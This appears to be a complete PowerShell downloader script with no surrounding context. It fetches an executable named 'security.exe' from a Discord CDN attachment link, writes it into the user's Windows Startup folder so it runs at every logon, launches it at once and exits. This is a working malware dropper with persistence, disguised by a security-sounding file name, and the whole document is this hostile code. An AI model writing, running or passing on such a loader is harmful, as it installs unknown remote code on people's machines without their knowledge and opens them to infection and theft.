$startupFolder = [Environment]::GetFolderPath("Startup")
$url = "https://cdn.discordapp.com/attachments/1209632213742657576/1345432952611274833/security.exe?ex=67c48794&is=67c33614&hm=33af143dd0a934bdd1c39431ca05a2cde5f3c97277bd40e01319e474675a0e18&"
$outputPath = Join-Path $startupFolder "security.exe"

Invoke-WebRequest -Uri $url -OutFile $outputPath
& $startupFolder\security.exe
[System.Environment]::Exit(0)
